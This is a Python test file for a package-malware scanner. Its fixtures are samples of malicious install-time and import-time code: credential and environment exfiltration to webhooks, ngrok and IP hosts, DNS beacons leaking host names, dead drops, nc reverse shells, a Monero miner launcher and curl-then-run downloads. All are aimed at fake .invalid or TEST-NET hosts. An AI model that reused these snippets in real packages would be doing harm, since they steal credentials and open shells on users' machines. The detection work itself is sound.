"""0.1.8: exfiltration shapes the rerun's misses showed (the releases GuardDog
caught and Lazaret didn't), strong wherever found — install scripts,
import-time code, the files a package runs when used:

* a chat bot or webhook whose secret is written in the code (a Telegram bot
  token next to api.telegram.org, a Discord webhook, a Slack webhook) in a
  file that makes network calls;
* credential files (.env, .npmrc …) read in a file that sends data to a raw
  public IP address;
* three or more credential folders named in one place (.ssh, .aws, .ethereum
  …), with network calls: a sweep of the home folder;
* the machine's user or host name sent to an address kept base64-encoded, or
  in a DNS lookup of a name the code builds; its public IP address sent to a
  data-capture service (an ngrok tunnel's own address counts as one);
* a copy of the whole environment serialized (`d = dict(os.environ)` …
  `urlencode(d)`), read by the harvest test;
* a reverse shell given as an argument list, or to an ngrok TCP address;
* a cryptocurrency miner (a Monero wallet address and a pool's arguments);
* curl or wget given `-o path` in an argument list, and the file run with
  Python (mistralai 2.4.6);
* at install time, a raw socket to a hard-coded address, and browser
  shortcuts rewritten to load an extension.

0.1.8 (the backlog's "what the exfiltration shapes don't read"):

* the DNS beacon's name built outside an f-string or a template literal —
  a sum, a %-format or a str.format(), a name assigned one of those, a
  lookup command written in code — or in a shell command whose host holds
  `$(whoami)`, $USER, %USERNAME% … (a reserved domain, .local or .internal,
  is a machine looking itself up);
* a dead drop: the host name sent to an address the code fetched at run
  time from a hard-coded URL (data-pipeline-check's webhooks);
* the host name read through require('os') or a name imported from it
  (@helpcentre/tesco-help: `require('os').hostname()`).

Each has crafted look-alikes that stay quiet. The secrets are fake and built
here rather than written out whole; hosts are .invalid or TEST-NET; nothing
runs. The npm engine is held to the same answers by
tests/architecture/test_js_parity_hooks.py.
"""
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core

TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
DISCORD = ("discord.com/api/webhooks/" + "123456789012345678/"
           + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01")
SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
XMR = "4" + ("AbCdEfGhJk" * 10)[:94]


def on_import(text, lang="py"):
    reasons, _line = core.import_time_risk(text, lang)
    return reasons, core.import_time_severity(reasons) if reasons else None


class ChatSecretTests(unittest.TestCase):
    def test_a_telegram_bot_token_in_the_code(self):
        text = ("import requests\nTOKEN = '" + TG + "'\ndef initialize():\n"
                "    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', files={'document': open(z, 'rb')})\n")
        self.assertEqual(on_import(text), (["sends data to a Telegram bot whose token is written in the code "
                                            "(bot 123456789)"], "CRITICAL"))
        inline = "import requests\nrequests.get(f'https://api.telegram.org/bot" + TG + "/sendMessage?text={m}')\n"
        self.assertEqual(on_import(inline)[1], "CRITICAL")
        shell = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n" \
                "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n"
        self.assertEqual(on_import(shell, "js")[1], "CRITICAL")
        self.assertIn("sends data to a Telegram bot whose token is written in the code (bot 123456789)",
                      core.install_script_risk(text))

    def test_discord_and_slack_webhooks(self):
        self.assertEqual(on_import("const u = 'https://" + DISCORD + "';\nfetch(u, { method: 'POST' });\n", "js"),
                         (["sends data to a Discord webhook whose token is written in the code "
                           "(webhook 123456789012345678)"], "CRITICAL"))
        self.assertEqual(on_import("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n", "js"),
                         (["sends data to a Slack webhook whose key is written in the code (TABCDEF12)"], "CRITICAL"))

    def test_quiet_without_a_secret_or_network_calls(self):
        for text in (
                # the token from the user's settings (tqdm's telegram contrib, healthchecks)
                "import requests\ndef send(token, chat):\n    requests.post(f'https://api.telegram.org/bot{token}/sendMessage')\n",
                "import os, requests\nTOKEN = os.environ['TG_TOKEN']\nrequests.post('https://api.telegram.org/bot' + TOKEN)\n",
                # a token-shaped string, no Telegram API
                "import requests\nKEY = '" + TG + "'\nrequests.get('https://x.invalid/')\n",
                # a token and the API, no network call
                "TOKEN = '" + TG + "'  # https://api.telegram.org\n",
                # placeholders
                "import requests\nrequests.post('https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "')\n",
                "import requests\nrequests.post('https://hooks.slack.com/services/T0000/B0000/abc')\n",
                "import requests\nrequests.post('https://discord.com/api/webhooks/{id}/{token}')\n",
                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text)[0], [])


class CredentialTests(unittest.TestCase):
    def test_credential_files_sent_to_an_ip_address(self):
        text = ("const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
                "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n"
                "const n = fs.readFileSync('~/.npmrc', 'utf8');\n")
        self.assertEqual(on_import(text, "js"), (["reads credential files and sends data to an IP address "
                                                   "(203.0.113.9)"], "CRITICAL"))

    def test_a_sweep_of_credential_folders(self):
        text = ("import os, re, urllib.request\n_HOME = os.path.expanduser('~')\n"
                "_SCAN_DIRS = [os.path.join(_HOME, d) for d in ['.ssh', '.aws', '.ethereum', '.config', '.docker', '.kube']]\n"
                "def report(wh, data):\n    urllib.request.urlopen(urllib.request.Request(wh, data=data))\n")
        self.assertEqual(on_import(text), (["collects files from several credential folders and sends data over the "
                                            "network (.ssh, .aws, .ethereum, .docker)"], "CRITICAL"))

    def test_quiet_look_alikes(self):
        for text in (
                # dotenv and a private address; a public address and no credential file
                "const fs = require('fs');\nconst d = fs.readFileSync('.env');\nfetch('http://10.0.0.5:8080/cfg');\n",
                "const fs = require('fs');\nfetch('https://203.0.113.9/health');\nfs.readFileSync('config.json');\n",
                # two folders; three without network calls; three far apart
                "import requests\nPATHS = ['.ssh', '.aws']\n",
                "BACKUP = ['.ssh', '.aws', '.gnupg']\n",
                "import requests\nA = '.ssh'\n" + "x = 1\n" * 200 + "B = '.aws'\n" + "y = 2\n" * 200 + "C = '.kube'\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text, "js" if "const" in text else "py")[0], [])


class HostAndAddressTests(unittest.TestCase):
    def test_the_host_name_sent_to_an_address_hidden_in_base64(self):
        text = ("import socket, base64, ssl, urllib.request\nhostname = socket.gethostname()\n"
                "u1 = 'aHR0cHM6Ly9h'\nu2 = 'LmludmFsaWQ='\n"
                "url = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\nurllib.request.urlopen(url)\n")
        self.assertEqual(on_import(text), (["sends the machine's user or host name to an address it hides in base64"],
                                           "CRITICAL"))

    def test_the_dns_beacon(self):
        setup = ("import re, socket, getpass\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
                 "def b():\n    h = re.sub(r'[^a-z0-9-]', '', socket.gethostname().lower())[:15]\n"
                 "    u = getpass.getuser()\n    socket.getaddrinfo(f\"{h}.{u}.beacon.x.invalid.com\", 80)\n")
        self.assertIn("sends the machine's user or host name in a DNS lookup of a name it builds",
                      core.install_script_risk(setup))
        js = "const dns = require('dns');\nconst os = require('os');\ndns.lookup(`${os.hostname()}.c.x.invalid.com`, cb);\n"
        self.assertEqual(on_import(js, "js")[1], "CRITICAL")

    def test_the_public_ip_address_to_a_capture_service(self):
        text = ("import threading, os, platform, requests\ndef _notify():\n"
                "    ip = requests.get('https://api.ipify.org', timeout=2).text\n"
                "    requests.post('https://webhook.site/0000-1111', json={'os': platform.platform(), 'ip': ip})\n"
                "threading.Thread(target=_notify, daemon=True).start()\n")
        self.assertEqual(on_import(text), (["sends the machine's public IP address to a data-capture service "
                                            "(webhook.site)"], "CRITICAL"))

    def test_an_ngrok_tunnels_address_is_a_capture_service(self):
        text = ("const { exec } = require('child_process');\n"
                "exec(`curl -X POST \"https://7195e44e.ngrok-free.app/t/$(whoami)/$(hostname)/\"`, () => {});\n")
        self.assertEqual(on_import(text, "js"), (["sends the machine's user or host name to a data-capture service "
                                                   "(7195e44e.ngrok-free.app)"], "CRITICAL"))

    def test_quiet_look_alikes(self):
        for text in (
                # the host name and a base64 literal that isn't an address; a DNS lookup of a fixed name
                "import socket, base64, requests\nh = socket.gethostname()\nk = base64.b64decode('QUJDRA==')\nrequests.get(u)\n",
                "import socket\nh = socket.gethostname()\nsocket.getaddrinfo('pypi.org', 443)\n",
                "import socket\nsocket.gethostbyname(f'{name}.svc.cluster.local')\n",        # no host information
                # a public IP address looked up for a mirror, no capture service
                "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
                # ngrok's own API and a client that names the service
                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text)[0], [])


class BuiltNamesAndDeadDropTests(unittest.TestCase):
    """0.1.8: the DNS beacon's name built outside a template, a dead drop, the
    host name through require('os')."""
    DNS = "sends the machine's user or host name in a DNS lookup of a name it builds"

    def test_names_built_in_code(self):
        for text, lang in (
                ("const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\n"
                 "dns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"),
                ("const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\n"
                 "dns.resolve(q, () => {});\n", "js"),
                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"),
                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"),
                ("import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
                 "socket.getaddrinfo(q, 80)\n", "py"),
                ("import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"),
                ("import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n", "py")):
            with self.subTest(text=text):
                reasons, sev = on_import(text, lang)
                self.assertIn(self.DNS, reasons)
                self.assertEqual(sev, "CRITICAL")

    def test_names_built_in_a_shell_command(self):
        for cmd in ("nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
                    "curl -s http://$(whoami).x.invalid.com/p", "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
                    "dig $USER.x.invalid.com", "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"):
            with self.subTest(cmd=cmd):
                self.assertIn(self.DNS, core.install_script_risk(cmd))

    def test_quiet_look_alikes(self):
        # a machine looking itself up; a reserved domain; an assignment, not a lookup; the identity in a
        # path; a service record of a zone; constants only
        for text in ("import socket\nip = socket.gethostbyname(socket.gethostname())\n",
                     "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
                     "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
                     "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com",
                     "curl -s http://x.invalid.com/$(whoami)",
                     "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\n"
                     "os.hostname();\n",
                     "import socket\nh = socket.gethostname()\nsocket.gethostbyname('api' + '.x.invalid.com')\n"):
            with self.subTest(text=text):
                self.assertEqual(core.dns_beacon_at(text, core._HOST_INFO_RE.search(text) is not None), -1)

    def test_a_dead_drop(self):
        want = "sends the machine's user or host name to an address it fetches at run time (from {})"
        for text, lang, host in (
                ("import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
                 "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"),
                ("import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
                 "    req = urllib.request.Request('https://x.github.io/c.json')\n"
                 "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n"
                 "    return _W\ndef send():\n    for w in hooks()[:2]:\n        urllib.request.urlopen("
                 "urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n", "py", "x.github.io"),
                ("const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
                 "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js",
                 "x.github.io"),
                ("const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
                 "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, "
                 "{ h: os.hostname() }); })();\n", "js", "gist.githubusercontent.com"),
                ("const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
                 "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
                 "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); "
                 "r.end(); }); });\n", "js", "x.github.io")):
            with self.subTest(text=text):
                reasons, sev = on_import(text, lang)
                self.assertIn(want.format(host), reasons)
                self.assertEqual(sev, "CRITICAL")
                self.assertIn(want.format(host), core.install_script_risk(text))

    def test_dead_drop_look_alikes(self):
        # a GET of the address; a literal address; a fetch of no literal URL; an update check; an Express
        # route; no host name read
        for text in ("import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
                     "requests.get(cfg['url'])\nsocket.gethostname()\n",
                     "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
                     "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
                     "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
                     "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
                     "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
                     ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
                     "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json())"
                     ".then((c) => { app.post(c.path, h); });\nos.hostname();\n"):
            with self.subTest(text=text):
                self.assertIsNone(core.dead_drop_at(text))
        quiet = ("import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
                 "requests.post(cfg['url'], json={'v': 1})\n")
        self.assertIsNotNone(core.dead_drop_at(quiet))                 # the shape, but no host name read:
        self.assertEqual(on_import(quiet), ([], None))                  # not a sign

    def test_the_host_name_through_require_os(self):
        for text in ("const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
                     "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
                     "const { hostname, platform } = require('os');\n"
                     "fetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
                     "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', "
                     "body: userInfo().username });\n",
                     "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', "
                     "data=gethostname())\n"):
            with self.subTest(text=text):
                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))
        self.assertEqual(core.install_script_risk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"),
                         [])


class RequestBinTests(unittest.TestCase):
    """RequestBin counts by its host names only: chromedriver's and
    phantomjs-prebuilt's installers define requestBinary() to download their
    binaries, and the bare word made each an exfiltration address (0.1.7), so
    their install hooks were CRITICAL and the guard blocked chromedriver."""

    def test_request_binary_is_not_requestbin(self):
        installer = ("const request = require('request');\n"
                     "function requestBinary(requestOptions, filePath) {\n"
                     "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
                     "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n")
        self.assertEqual(core.install_script_risk(installer), [])
        self.assertEqual(core.capture_service(installer), None)

    def test_its_addresses_still_count(self):
        for host in ("requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"):
            with self.subTest(host):
                text = f"const https = require('https');\nhttps.get('https://{host}/r/abc?d=' + process.env.NPM_TOKEN);\n"
                self.assertEqual(core.install_script_risk(text),
                                 [f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
        beacon = ("import socket, requests\n"
                  "requests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n")
        self.assertEqual(on_import(beacon), (["sends the machine's user or host name to a data-capture service "
                                              "(requestbin.net)"], "CRITICAL"))


class EnvironmentCopyTests(unittest.TestCase):
    def test_a_copy_of_the_environment_serialized(self):
        text = ("import os\nimport urllib.request\nimport urllib.parse\n\ndef run_payload():\n"
                "    data = dict(os.environ)\n    encoded = urllib.parse.urlencode(data).encode('utf-8')\n"
                "    url = 'https://5cecdbdb.ngrok.app/collect'\n"
                "    urllib.request.urlopen(urllib.request.Request(url, data=encoded))\n")
        self.assertEqual(on_import(text), (["reads credentials or the whole environment and sends them to an "
                                            "exfiltration service (ngrok)"], "CRITICAL"))
        js = "const https = require('https');\nconst e = { ...process.env };\nconst body = JSON.stringify(e);\nhttps.request(o).end(body);\n"
        self.assertEqual(on_import(js, "js"), (["reads credentials or the whole environment and sends data over the "
                                                 "network"], "MAJOR"))

    def test_a_copy_handed_to_a_subprocess_is_not_a_harvest(self):
        text = ("import os, subprocess, requests\nenv = dict(os.environ)\nenv['PATH'] = '/opt/bin'\n"
                "subprocess.run(['tool'], env=env)\nrequests.get(u)\n")
        self.assertEqual(on_import(text)[0], [])


class ShellMinerAndDownloadTests(unittest.TestCase):
    def test_reverse_shells_as_argument_lists(self):
        ngrok = "const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151'], {});\n"
        self.assertEqual(on_import(ngrok, "js"), (["opens a reverse shell"], "CRITICAL"))
        args = "const cp = require('child_process');\ncp.spawn('nc', ['203.0.113.2', '4444', '-e', '/bin/sh']);\n"
        self.assertEqual(on_import(args, "js"), (["opens a reverse shell"], "CRITICAL"))
        self.assertEqual(on_import("const cp = require('child_process');\ncp.spawn('nc', ['-l', '8080']);\n", "js")[0], [])

    def test_a_miner(self):
        text = ("import os, subprocess\ndef safe_run(path):\n    os.chmod(path, 0o770)\n"
                "    command = [path, '-u', '" + XMR + "', '-o', 'pool.x.invalid:8080', '-k']\n"
                "    subprocess.Popen(command, stdin=subprocess.DEVNULL, preexec_fn=os.setsid)\n")
        reasons, sev = on_import(text)
        self.assertIn("runs a cryptocurrency miner (a Monero wallet address)", reasons)
        self.assertEqual(sev, "CRITICAL")
        for quiet in ("ADDRESS = '" + XMR + "'  # a donation address\n",            # an address, no miner
                      "import subprocess\nsubprocess.run(['tool', '-o', 'out.txt'])\n"):  # arguments, no address
            with self.subTest(quiet[:40]):
                self.assertEqual(on_import(quiet)[0], [])

    def test_curl_in_an_argument_list_then_run_with_python(self):
        text = ("import sys as _sys\nimport subprocess as _sub\nimport os as _os\n\ndef _run_background_task():\n"
                "    _url = 'https://203.0.113.4/transformers.pyz'\n    _dest = '/tmp/transformers.pyz'\n"
                "    if not _os.path.exists(_dest):\n"
                "        _sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
                "    if _os.path.exists(_dest):\n"
                "        _sub.Popen([_sys.executable, _dest], start_new_session=True)\n\n_run_background_task()\n")
        self.assertEqual(on_import(text), (["downloads a script and runs it with Python"], "CRITICAL"))
        # a binary downloaded and run on its own stays the installer's MAJOR shape
        binary = text.replace("[_sys.executable, _dest]", "[_dest, '--version']")
        self.assertEqual(on_import(binary), (["downloads a file and then runs it"], "MAJOR"))


class BoundedWorkTests(unittest.TestCase):
    def test_hostile_inputs_finish_fast(self):
        """Each shape examines a bounded number of matches, and none of its
        patterns backtracks on a long run of what it looks for."""
        import time
        texts = {
            "tokens": "import requests\napi.telegram.org\n" + ("'123456789:AA" + "A" * 33 + "', ") * 20000,
            "ip literals": "connect\n" + "'203.0.113.7', " * 50000,
            "credential folders": "import requests\n" + "'.ssh', x, " * 30000,
            "environment copies": "import os\n" + "e = dict(os.environ)\n" * 20000 + "x" + " " * 100000,
            "dns lookups": "import socket\nsocket.gethostname()\n" + "getaddrinfo(f'{a}" + "b" * 200 + "', 1)\n" * 5000,
            "reverse shell args": "'nc'" + " '-x'," * 50000,
            "monero": "'-o' exec(" + ("4" + "a" * 93 + "! ") * 5000,
            "a long line": "getaddrinfo(f\"" + "{a}." * 50000 + "\n",
            "dead drop fetches": "import socket\nsocket.gethostname()\n"
                                 + "c = requests.get('https://x.invalid/c').json()\n" * 5000
                                 + "requests.post(c['u'], data=1)\n" * 5000,
            "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')"
                                + ".then((r) => r)" * 50000 + "\n",
            "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c"
                                  + " + c" * 200000 + "\n",
            "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n" * 20000
                                  + "socket.gethostbyname(q)\n" * 20000,
            "dns shell identities": "nslookup " + "$(whoami)" * 100000 + "\n" + "echo "
                                    + "$(whoami).x.invalid.com " * 50000,
        }
        for label, text in texts.items():
            with self.subTest(label):
                start = time.perf_counter()
                core.import_time_risk(text, "py")
                core.install_script_risk(text)
                self.assertLess(time.perf_counter() - start, 5.0)


class InstallTimeTests(unittest.TestCase):
    def test_a_raw_socket_to_a_hard_coded_address(self):
        setup = ("import socket\nfrom setuptools.command.install import install\nclass P(install):\n"
                 "    def run(self):\n        ip = '203.0.113.5'\n        port = 12345\n"
                 "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, port))\n")
        self.assertIn("contacts an address typical of data exfiltration (203.0.113.5)", core.install_script_risk(setup))
        self.assertIn("contacts an address typical of data exfiltration (172.16.0.103)",
                      core.install_script_risk(setup.replace("203.0.113.5", "172.16.0.103")))
        for quiet in (setup.replace("203.0.113.5", "127.0.0.1"), setup.replace("203.0.113.5", "8.8.8.8"),
                      "VERSION = '1.2.3.4'\n"):
            with self.subTest(quiet[-40:]):
                self.assertEqual([r for r in core.install_script_risk(quiet) if "exfiltration" in r], [])
        # not at import time: a client connects to addresses
        self.assertEqual(on_import(setup)[0], [])

    def test_browser_shortcuts_rewritten(self):
        setup = ("from win32com.client import Dispatch\nshell = Dispatch('WScript.Shell')\n"
                 "for f in files:\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(root + f)\n"
                 "        s.Arguments = '--load-extension={p}\\\\Extension'\n        s.Save()\n")
        self.assertIn("rewrites browser shortcuts to load an extension", core.install_script_risk(setup))
        selenium = "from selenium import webdriver\no = webdriver.ChromeOptions()\no.add_argument('--load-extension=ext')\n"
        self.assertNotIn("rewrites browser shortcuts to load an extension", core.install_script_risk(selenium))


if __name__ == "__main__":
    unittest.main()
